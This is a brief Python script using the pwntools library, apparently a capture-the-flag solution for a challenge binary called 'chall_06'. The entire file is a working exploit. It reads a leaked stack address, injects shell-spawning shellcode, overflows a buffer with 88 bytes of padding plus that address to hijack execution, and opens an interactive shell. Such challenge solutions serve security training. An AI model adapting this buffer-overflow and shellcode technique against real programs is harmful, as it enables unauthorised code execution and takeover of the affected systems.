from pwn import *
#start the process and receive the prompt
r=process("./chall_06")
r.recvuntil(":")
#receive the value and convert it to an integer
var50h = r.recv()
var50h = int(var50h, 16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
r.sendline(shellcode)
r.sendline(b's'*88+p64(var50h))
r.interactive()
r.close()
